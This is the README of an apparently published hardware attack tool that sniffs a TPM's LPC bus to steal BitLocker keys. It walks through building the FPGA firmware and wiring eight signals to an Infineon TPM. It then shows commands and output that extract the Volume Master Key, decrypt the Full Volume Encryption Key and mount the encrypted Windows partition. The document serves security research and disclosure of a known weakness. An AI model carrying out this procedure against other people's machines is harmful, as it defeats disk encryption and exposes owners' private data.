# iCEstick LPC TPM Sniffer

The iCEstick LPC TPM Sniffer is a modified version of [Alexander Couzens'](https://github.com/lynxis)
[LPC Sniffer](https://github.com/lynxis/lpc_sniffer/) including the TPM-specific modifications by Denis Andzakovic ([LPC Sniffer TPM](https://github.com/denandz/lpc_sniffer_tpm)) for sniffing specific LPC messages of trusted platform modules (TPMs).

This implementation was used for reproducing the LPC sniffing attack described in the blog article [Extracting BitLocker Keys from a TPM](https://pulsesecurity.co.nz/articles/TPM-sniffing) by Denis Andzakovic targeting an [ASUS TPM-M R2.0](https://www.asus.com/Motherboard-Accessories/TPM-M-R2-0/) with an [Infineon SLB 9665 TT2.0 TPM](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/).

In January 2019, this LPC bus sniffing attack against Microsoft BitLocker in TPM-only mode was mentioned by Hector Martin ([@marcan42](https://twitter.com/marcan42)) in [this Tweet](https://twitter.com/marcan42/status/1080869868889501696).

## Hardware Requirements

- [Lattice iCEstick Evaluation Kit](http://www.latticesemi.com/icestick)
- Target computer system with [Infineon SLB 9665 TT2.0 TPM](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/) or similar TPM with LPC bus communication

## Software Requirements

- [Python 3](https://www.python.org/)
- [pylibftdi](https://pypi.org/project/pylibftdi/)
- [sty](https://pypi.org/project/sty/)
- [yosys](https://github.com/YosysHQ/yosys)
- [nextpnr-ice40](https://github.com/YosysHQ/nextpnr)
- [Project IceStorm Tools](https://github.com/cliffordwolf/icestorm)

## Installation

The iCEstick Glitcher can be downloaded and built using the SymbiFlow toolchain in the following way:
```
git clone https://github.com/SySS-Research/icestick-lpc-tpm-sniffer.git
cd icestick-lpc-tpm-sniffer
make
make prog
  
virtualenv sniffing
source sniffing/bin/activate
pip install -r python/requirements.txt
```

For using the fast serial communication of the iCEstick LPC TPM Sniffer, the [Fast Opto-Isolated Serial Interface Mode](https://www.ftdichip.com/Support/Documents/AppNotes/AN_131_FT2232D_H_Fast%20Opto-Isolated%20Serial%20Interface%20mode.pdf) on channel B of the iCEstick's FT2232H has to be enabled.

## Wiring
For sniffing the LPC bus communication of a TPM like the [Infineon SLB 9665 TT 2.0](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/), the following 8 signals have to be connected:
1. GND
2. LCLK
3. LRST
4. LFRAME
5. LAD0
6. LAD1
7. LAD2
8. LAD3

The corresponding pins of the [Infineon SLB 9665 TT 2.0](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/) are highlighted in the following pinout figure.

![Pinout of Infineon SLB 9665 TT 2.0](/images/infineon_tpm_slb_9665_tt2_0_pinout.png)

The following figures show the wiring of an [ASUS TPM-M R2.0](https://www.asus.com/Motherboard-Accessories/TPM-M-R2-0/), which uses [Infineon SLB 9665 TT 2.0](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/), via a simple adapter with a Lattice iCEstick.

![Wiring example for an ASUS TPM-M R2.0](/images/icestick_and_asus_tpm.jpg)

![Adapter pinout for ASUS TPM-M R2.0](/images/asus_tpm_adapter_pins.jpg)

The pin assignment for the the Lattice iCEstick one are shown in the next figure.
![Pin assignment for Lattice iCEstick](/images/icestick-lpc-tpm-sniffer_pinout.png)

## Usage

The iCEstick LPC TPM Sniffer is used via the Python command tool **iCE LPC TPM Sniffer**.
```
python lpc-tpm-sniffer.py
```
In order to extract the current BitLocker Volume Master Key (VMK) of a BitLocker-encrypted partition, the following steps are required:

1. Turn off the target system
2. Connect the iCEstick with the TPM of the target system
3. Start the Python command tool **iCEstick LPC TPM Sniffer** on the attacker system
4. Turn on the target system

The following output exemplarily shows a successful sniffing attack.
```
$ python lpc-tpm-sniffer.py
 
██╗ ██████╗███████╗    ██╗     ██████╗  ██████╗    ████████╗██████╗ ███╗   ███╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗
██║██╔════╝██╔════╝    ██║     ██╔══██╗██╔════╝    ╚══██╔══╝██╔══██╗████╗ ████║    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
██║██║     █████╗      ██║     ██████╔╝██║            ██║   ██████╔╝██╔████╔██║    ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
██║██║     ██╔══╝      ██║     ██╔═══╝ ██║            ██║   ██╔═══╝ ██║╚██╔╝██║    ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
██║╚██████╗███████╗    ███████╗██║     ╚██████╗       ██║   ██║     ██║ ╚═╝ ██║    ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝      ╚═════╝       ╚═╝   ╚═╝     ╚═╝     ╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
iCE LPC TPM Sniffer v0.2 by Matthias Deeg - SySS GmbH
Extract BitLocker Volume Master Keys using an iCEstick or iCEBreaker LPC TPM Sniffer
---
[*] Start sniffing
[*] Received 2556 bytes
[+] Found BitLocker VMK: 784f31369defc6b8d2baa354b6119f0777395962feb29b40efcf3078b48189ba
[+] Created VMK file 'vmk.bin' for use with BitLocker FVEK Decrypt
```

Encrypted BitLocker Full Volume Encryption Keys (FVEK) can be decrypted using the Python tool **BitLocker FVEK Decrypt**.
```
$ python bitlocker_fvek_decrypt.py --help
 
  ___ _ _   _            _             _____   _____ _  __  ___                       _  
 | _ |_) |_| |   ___  __| |_____ _ _  | __\ \ / / __| |/ / |   \ ___ __ _ _ _  _ _ __| |_
 | _ \ |  _| |__/ _ \/ _| / / -_) '_| | _| \ V /| _|| ' <  | |) / -_) _| '_| || | '_ \  _|
 |___/_|\__|____\___/\__|_\_\___|_|   |_|   \_/ |___|_|\_\ |___/\___\__|_|  \_, | .__/\__|
                                                                            |__/|_|      
BitLocker FVEK Decrypt v0.2 by Matthias Deeg - SySS GmbH
Decrypts encrypted BitLocker Full Volume Encryption Keys (FVEK)
---
usage: ./bitlocker_key_decryptor.py [-h] -f FILENAME -k KEY
 
optional arguments:
  -h, --help            show this help message and exit
  -f FILENAME, --filename FILENAME
                        File with dislocker-metadata output of targeted BitLocker-encrypted partition
  -k KEYFILE, --keyfile KEYFILE
                        File with sniffed BitLocker Volume Master Key (VMK)
```

The encrypted FVEK, the used nonce, and the corresponding message authentication code (MAC) can be extracted from the encrypted BitLocker-partition using the software tool [dislocker-metadata](https://github.com/Aorimn/dislocker).
```
sudo dislocker-metadata -V /dev/sda2 > dislocker-metadata.txt
```

The following output exemplarily illustrates the successful decryption of a FVEK with the correctly sniffed VMK:
```
$ python bitlocker_fvek_decrypt.py -f dislocker-metadata.txt -k vmk.bin
 
  ___ _ _   _            _             _____   _____ _  __  ___                       _  
 | _ |_) |_| |   ___  __| |_____ _ _  | __\ \ / / __| |/ / |   \ ___ __ _ _ _  _ _ __| |_
 | _ \ |  _| |__/ _ \/ _| / / -_) '_| | _| \ V /| _|| ' <  | |) / -_) _| '_| || | '_ \  _|
 |___/_|\__|____\___/\__|_\_\___|_|   |_|   \_/ |___|_|\_\ |___/\___\__|_|  \_, | .__/\__|
                                                                            |__/|_|      
BitLocker FVEK Decrypt v0.2 by Matthias Deeg - SySS GmbH
Decrypts encrypted BitLocker Full Volume Encryption Keys (FVEK)
---
[+] Extracted nonce:
    409b87a369dbd501d9010000
[+] Extracted MAC:
    12c7b1c759e76ad88c3efd451a0fc945
[+] Extracted payload:
    fd82fcf27ded951a2327e2e9d00b9ba0a3245f949bc53163bcc26088531215d17be6f99794d3fcfeb22bb41e
[+] Decrypted Full Volume Encryption Key (FVEK):
    561bd26ca61fa3fb3445994b0f62649ce86e90085c0ff25dda57be61c2667cb6
[+] Created FVEK file 'fvek.bin' for use with dislocker
```

By knowing the FVEK, the BitLocker-encrypted partition can be mounted, for instance using the software tool **bdemount**.
```
mkdir /mnt/bitlocker
 
mkdir /mnt/ntfs
 
bdemount -k 561bd26ca61fa3fb3445994b0f62649ce86e90085c0ff25dda57be61c2667cb6 /dev/sda2 /mnt/bitlocker/
 
mount -r ro /mnt/bitlocker/bde1 /mnt/ntfs
 
ls -la /mnt/ntfs/                                                                                                                                                                                                                                                                                         
total 19740361                                                                                                                                                                                                                                                                                                                
drwxrwxrwx 1 root root           0 14. Jan 08:30 '$Recycle.Bin'                                                                                                                                                                                                                                                               
drwxrwxrwx 1 root root        4096 28. Jan 15:33  .                                                                                                                                                                                                                                                                           
drwxr-xr-x 4 root root        4096  4. Feb 15:54  ..                                                                                                                                                                                                                                                                          
drwxrwxrwx 1 root root        4096 14. Jan 10:07  AMD                                                                                                                                                                                                                                                                         
drwxrwxrwx 1 root root           0 14. Jan 10:07  Config.Msi                                                                                                                                                                                                                                                                  
lrwxrwxrwx 2 root root          15 14. Jan 03:52 'Documents and Settings' -> /mnt/ntfs/Users                                                                                                                                                                                                                                  
drwxrwxrwx 1 root root           0 13. Jan 18:12  NVIDIA                                                                                                                                                                                                                                                                      
drwxrwxrwx 1 root root           0 19. Mär 2019   PerfLogs                                                                                                                                                                                                                                                                    
drwxrwxrwx 1 root root        4096 14. Jan 09:52 'Program Files'                                                                                                                                                                                                                                                              
drwxrwxrwx 1 root root        8192 28. Jan 14:52 'Program Files (x86)'                                                                                                                                                                                                                                                        
drwxrwxrwx 1 root root        4096 30. Jan 11:32  ProgramData                                                                                                                                                                                                                                                                 
drwxrwxrwx 1 root root           0 14. Jan 03:52  Recovery                                                                                                                                                                                                                                                                    
drwxrwxrwx 1 root root       12288 30. Jan 13:26 'System Volume Information'                                                                                                                                                                                                                                                  
drwxrwxrwx 1 root root        4096 13. Jan 12:18  Users                                                                                                                                                                                                                                                                       
drwxrwxrwx 1 root root       16384 30. Jan 13:13  Windows                                                                                                                                                                                                                                                                     
-rwxrwxrwx 1 root root         206 14. Jan 09:48  audio.log                                                                                                                                                                                                                                                                   
-rwxrwxrwx 1 root root 17110282240  4. Feb 15:51  hiberfil.sys                                                                                                                                                                                                                                                                
-rwxrwxrwx 1 root root  3087007744  4. Feb 15:44  pagefile.sys                                                                                                                                                                                                                                                                
-rwxrwxrwx 1 root root    16777216  4. Feb 15:44  swapfile.sys
```

Alternatively, the created file **fvek.bin** containing the decrypted FVEK can be used in combination with the software tool [dislocker](https://github.com/Aorimn/dislocker) to mount the BitLocker-encrypted partition as follows (***remark**: If a BitLocker-partition should be mounted with read and write access, it should be fixed first using **ntfsfix** to have a clean state):

```
mkdir /mnt/bitlocker
 
mkdir /mnt/ntfs
 
dislocker -k fvek.bin -V /dev/sda2 /mnt/bitlocker/
 
ntfsfix /mnt/bitlocker/dislocker-file
 
mount -o rw /mnt/bitlocker/dislocker-file /mnt/ntfs/
 
# ls -la /mnt/ntfs/
total 9714805
drwxrwxrwx 1 root root          0 14. Jan 08:30 '$Recycle.Bin'
drwxrwxrwx 1 root root       4096  4. Feb 17:42  .
drwxr-xr-x 4 root root       4096  4. Feb 17:48  ..
drwxrwxrwx 1 root root       4096 14. Jan 10:07  AMD
drwxrwxrwx 1 root root          0 14. Jan 10:07  Config.Msi
lrwxrwxrwx 2 root root         15 14. Jan 03:52 'Documents and Settings' -> /mnt/ntfs/Users
drwxrwxrwx 1 root root          0 13. Jan 18:12  NVIDIA
drwxrwxrwx 1 root root          0 19. Mär 2019   PerfLogs
drwxrwxrwx 1 root root       4096 14. Jan 09:52 'Program Files'
drwxrwxrwx 1 root root       8192 28. Jan 14:52 'Program Files (x86)'
drwxrwxrwx 1 root root       4096 30. Jan 11:32  ProgramData
drwxrwxrwx 1 root root          0 14. Jan 03:52  Recovery
drwxrwxrwx 1 root root      12288 30. Jan 13:26 'System Volume Information'
drwxrwxrwx 1 root root       4096 13. Jan 12:18  Users
drwxrwxrwx 1 root root      16384 30. Jan 13:13  Windows
-rwxrwxrwx 1 root root        206 14. Jan 09:48  audio.log
-rwxrwxrwx 1 root root 6844112896  4. Feb 17:42  hiberfil.sys
-rwxrwxrwx 1 root root 3087007744  4. Feb 17:42  pagefile.sys
-rwxrwxrwx 1 root root   16777216  4. Feb 17:42  swapfile.sys
```

## Demo

This demo video exemplarily shows how a sniffing attack against the Low Pin Count (LPC) bus communication of a trusted platform module (TPM) using the iCEstick LPC TPM Sniffer.
In this demo video, a current Windows 10 system (1909) with Microsoft BitLocker in TPM-only mode and an [ASUS TPM-M R2.0](https://www.asus.com/Motherboard-Accessories/TPM-M-R2-0/) using an [Infineon SLB 9665 TT 2.0](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/) chip is attacked.

[![SySS PoC Video: LPC Bus Sniffing Attack against Microsoft BitLocker in TPM-only Mode](/images/icestick_lpc_tpm_sniffer_poc_video.jpg)](https://www.youtube.com/watch?v=-Fj3SeZww3M "LPC Bus Sniffing Attack against Microsoft BitLocker in TPM-only Mode")

## References

* [LPC Sniffer](https://github.com/lynxis/lpc_sniffer/), Alexander Couzens, 2017
* [LPC Sniffer TPM](https://github.com/denandz/lpc_sniffer_tpm), Denis Andzakovic, 2019
* [Extracting BitLocker Keys from a TPM](https://pulsesecurity.co.nz/articles/TPM-sniffing), Denis Andzakovic, Pulse Security, 2019
* [FT2232D/H Fast Opto-Isolated Serial Interface Mode](https://www.ftdichip.com/Support/Documents/AppNotes/AN_131_FT2232D_H_Fast%20Opto-Isolated%20Serial%20Interface%20mode.pdf)
* [Infineon SLB 9665 TT 2.0](https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/optiga-tpm/slb-9665tt2.0/)
* [ASUS TPM-M R2.0](https://www.asus.com/Motherboard-Accessories/TPM-M-R2-0/)

## Disclaimer

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
